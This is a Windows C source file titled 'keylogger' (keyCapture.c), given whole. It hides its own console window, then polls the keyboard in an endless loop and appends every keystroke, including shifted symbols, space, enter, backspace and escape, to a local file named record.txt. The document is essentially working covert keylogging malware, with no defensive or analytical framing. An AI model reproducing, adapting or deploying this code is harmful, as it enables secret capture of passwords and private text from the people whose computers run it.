/*######################################################################################
# Dev: cnd.dev
# Program Name: keylogger
# Version: 1.0.0
#  - Major.Minor.Update/BuildNumber
# Date: 202054OCT25
# Filename: keyCapture.c
# Dependency: N/A
# Compile Cmd: gcc -m64 -O1 keyCapture.c -o keyCapture-v1.0.0-win-x86-64
# Synopsis:
#  - Overview: describes what the program does, how it works, and its key components
#  - Technical: ...
######################################################################################*/

#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <errno.h>
#include <windows.h>
#include <winuser.h>
#include <stdbool.h>

void hideWindow(void) {
	HWND hidden;
	AllocConsole();
	hidden = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hidden, 0);
}

void logging() {
	bool infiniteLoop = true;
	char key;

	while (infiniteLoop) {
		//Read US Keyboard ASCII Characters - currently set up to take uppercase NOT lowercase
		for (key = 8; key <= 127; key++) {
			// if key is pressed (from up to down)
			if (GetAsyncKeyState(key) == -32767) {
				//ios::app opens the file in append mode
				FILE* pFile = NULL;

				pFile = fopen("record.txt", "a");
				if (pFile != NULL) {
					//if shift key (left or right) is pressed AND uppercase A-Z is pressed, then capture the lowercase equivalent
					if ((key >= 65 && key <= 90) && !(GetAsyncKeyState(0x10))) {
						key += 32;   // change upper to lowercase
						fputc(key, pFile);
						fclose(pFile);
						break;
					}

					//if no shift key is pressed, then capture uppercase
					else if (key >= 65 && key <= 90) {
						fputc(key, pFile);
						fclose(pFile);
						break;
					}

					//
					else {
						switch (key) {
						case 48: {
							if (GetAsyncKeyState(0x10))
								fputc(')', pFile);
							else
								fputc('0', pFile);
							break;
						}
						case 49: {
							if (GetAsyncKeyState(0x10))
								fputc('!', pFile);
							else
								fputc('1', pFile);
							break;
						}
						case 50: {
							if (GetAsyncKeyState(0x10))
								fputc('@', pFile);
							else
								fputc('2', pFile);
							break;
						}
						case 51: {
							if (GetAsyncKeyState(0x10))
								fputc('#', pFile);
							else
								fputc('3', pFile);
							break;
						}
						case 52: {
							if (GetAsyncKeyState(0x10))
								fputc('$', pFile);
							else
								fputc('4', pFile);
							break;
						}
						case 53: {
							if (GetAsyncKeyState(0x10))
								fputc('%', pFile);
							else
								fputc('5', pFile);
							break;
						}
						case 54: {
							if (GetAsyncKeyState(0x10))
								fputc('^', pFile);
							else
								fputc('6', pFile);
							break;
						}
						case 55: {
							if (GetAsyncKeyState(0x10))
								fputc('&', pFile);
							else
								fputc('7', pFile);
							break;
						}
						case 56: {
							if (GetAsyncKeyState(0x10))
								fputc('*', pFile);
							else
								fputc('8', pFile);
							break;
						}
						case 57: {
							if (GetAsyncKeyState(0x10))
								fputc('(', pFile);
							else
								fputc('9', pFile);
							break;
						}

						//VIRTUAL KEYS NAMED CONSTANTS IN WINDOWS API (windows.h/winuser.h)
						case VK_SPACE: {
							fputc(' ', pFile);
							break;
						}
						case VK_RETURN: {
							fputc('\n', pFile);
							break;
						}
						case VK_TAB: {
							fputc('	', pFile);
							break;
						}
						case VK_BACK: {
							fputs("[BACKSPACE]", pFile);
							break;
						}
						case VK_ESCAPE: {
							fputs("[ESC]", pFile);
							break;
						}
						case VK_DELETE: {
							fputs("[DELETE]", pFile);
							break;
						}
						}
					}
				}
				else {
					perror("File access failed");
					printf("Error code: %d\n", errno);
				}
			}
		}
	}
}

int main(void)
{
	hideWindow();
	logging();
	return 0;
}
